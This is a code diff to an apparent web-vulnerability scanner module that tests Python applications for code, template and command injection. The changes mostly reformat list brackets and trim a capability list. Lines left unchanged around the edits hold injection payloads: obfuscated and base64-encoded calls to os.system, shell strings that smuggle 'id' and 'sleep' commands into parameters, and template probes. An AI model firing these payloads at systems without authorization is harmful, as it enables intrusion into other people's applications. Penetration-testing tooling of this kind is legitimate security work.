@@ -18,8 +18,7 @@ class Module(Auxiliary, Http_client):
         'references': [
             'https://owasp.org/www-community/attacks/Code_Injection',
             'https://owasp.org/www-community/attacks/Command_Injection',
-            'https://portswigger.net/web-security/os-command-injection',
-        ],
+            'https://portswigger.net/web-security/os-command-injection'],
     'agent': {
         'risk': 'active',
         'effects': ['network_probe'],
@@ -44,10 +43,7 @@ class Module(Auxiliary, Http_client):
          'endpoint_pattern_any': [],
          'param_any': [],
          'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''}],
+        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''}],
          'consumes_capabilities': [],
          'option_bindings': {},
          'suggested_followups': []},
@@ -74,8 +70,7 @@ class Module(Auxiliary, Http_client):
         'getattr(getattr(__import__("os"), "system"), "__call__")("id")',
         
         # Base64 encoded
-        'eval(__import__("base64").b64decode("X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIik="))',
-    ]
+        'eval(__import__("base64").b64decode("X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIik="))']
 
     # Template injection payloads (Jinja2, Mako, etc.)
     TEMPLATE_INJECTION_PAYLOADS = [
@@ -96,8 +91,7 @@ class Module(Auxiliary, Http_client):
         
         # Django templates (limited)
         '{{7|add:7}}',
-        '{{request}}',
-    ]
+        '{{request}}']
 
     # Command injection payloads
     COMMAND_INJECTION_PAYLOADS = [
@@ -110,8 +104,7 @@ class Module(Auxiliary, Http_client):
         '; python3 -c "import os; os.system(\'id\')"',
         '| python3 -c "import os; os.system(\'id\')"',
         '; sleep 5',
-        '| sleep 5',
-    ]
+        '| sleep 5']
 
     # Pickle deserialization payloads (base64 encoded)
     PICKLE_PAYLOADS = [
@@ -124,8 +117,7 @@ class Module(Auxiliary, Http_client):
         'cmd', 'command', 'exec', 'eval', 'code',
         'template', 'view', 'render', 'format',
         'data', 'input', 'value', 'param', 'query',
-        'user', 'username', 'email', 'name',
-    ]
+        'user', 'username', 'email', 'name']
 
     def check(self):
         """
@@ -142,8 +134,7 @@ class Module(Auxiliary, Http_client):
                     'python', 'django', 'flask', 'tornado',
                     'jinja2', 'mako', 'werkzeug',
                     'x-powered-by.*python', 'server.*python',
-                    'wsgiserver', 'gunicorn', 'uwsgi',
-                ]
+                    'wsgiserver', 'gunicorn', 'uwsgi']
                 
                 if any(indicator in content or indicator in headers for indicator in python_indicators):
                     return True
@@ -257,8 +248,7 @@ class Module(Auxiliary, Http_client):
             python_errors = [
                 'syntaxerror', 'nameerror', 'typeerror',
                 'attributeerror', 'importerror', 'indentationerror',
-                'traceback', 'file "<string>"', 'file "<stdin>"',
-            ]
+                'traceback', 'file "<string>"', 'file "<stdin>"']
             
             response_lower = response.text.lower()
             for error in python_errors:
@@ -336,8 +326,7 @@ class Module(Auxiliary, Http_client):
             # Check for template errors
             template_errors = [
                 'jinja2', 'mako', 'template error',
-                'template syntax error', 'undefined',
-            ]
+                'template syntax error', 'undefined']
             
             response_lower = response.text.lower()
             for error in template_errors:
